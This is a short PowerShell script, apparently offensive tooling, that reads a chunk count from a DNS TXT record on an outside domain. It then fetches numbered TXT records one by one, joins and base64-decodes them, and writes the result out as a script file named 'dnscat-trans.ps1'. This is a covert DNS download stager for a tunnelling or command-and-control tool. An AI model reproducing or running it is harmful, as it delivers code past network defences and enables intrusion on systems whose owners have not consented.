$d="my.domain.co.uk"
$cm="dnscatcount.$d"
$co=(Invoke-Command -ScriptBlock {nslookup -type=txt $cm} 2>$null)
$coa=([String]$co).Split('"')
$dr=$coa[6]

$c=[convert]::ToInt32($dr,10)
$o=@()
for ($i=1;$i -le $c;$i++)
{
    $n="dnscat" + $i.toString() + ".$d"
    $co=(Invoke-Command -ScriptBlock {nslookup -type=txt $n} 2>$null)
    $coa=([String]$co).Split('"')
    $dr=$coa[6]	
    $o+=$dr
    Start-Sleep -s 1
}
$b64=-join $o
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64)) | Add-Content "dnscat-trans.ps1"